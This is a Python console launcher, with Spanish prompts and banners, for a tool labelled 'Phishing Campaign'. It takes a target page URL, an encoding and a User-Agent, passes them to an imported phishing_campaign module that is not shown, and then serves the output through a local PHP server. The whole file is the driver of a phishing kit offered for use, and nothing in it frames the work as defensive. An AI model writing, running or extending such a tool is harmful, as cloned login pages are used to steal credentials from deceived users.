import phishing_campaign as phc
import os
import subprocess
import pyfiglet
from colorama import init
from colorama import Fore

init()  # Para que la librería pyfiglet imprima a color

try:
    while True:
        print("\n\n\n")
        pyfiglet.print_figlet('Phishing~~~',
                              colors='CYAN')
        pyfiglet.print_figlet('~~~Campaign',
                              colors='YELLOW')
        print(Fore.GREEN +
              '[?] Para salir presiona la combinación:'
              ' Ctrl + C y luego enter'
              '\n[?] ESCRIBE HELP PARA IR AL MENÚ DE AYUDA')

        print(Fore.LIGHTMAGENTA_EX)
        url = input('[>] Ingresa el link de la página: ')

        if url == 'help' or url == 'HELP':
            phc.help()
            continue

        encoding_file = input('[>] ¿Desea especificar un encoding? : ')
        user_agent = input('[>] ¿Desea especificar un User Agent? : ')

        if not encoding_file:
            encoding_file = 'UTF-8'

        try:
            print(Fore.BLUE)
            if not phc.start(url, encoding_file, user_agent):
                os.system('pause')
                continue
            # subprocess.Popen('python mask.py',
            #                  creationflags=subprocess.CREATE_NEW_CONSOLE)
            print('[+] Servidor')
            os.system('php -S localhost:3000')
            print('[-] Servidor')
        except:
            os.system('pause')
            continue
except:
    print("\n\n\n")
    pyfiglet.print_figlet('Phishing~~~',
                          colors='CYAN')
    pyfiglet.print_figlet('~~~Campaign',
                          colors='YELLOW')
    pyfiglet.print_figlet('~~~CLOSE~~~',
                          colors='RED')
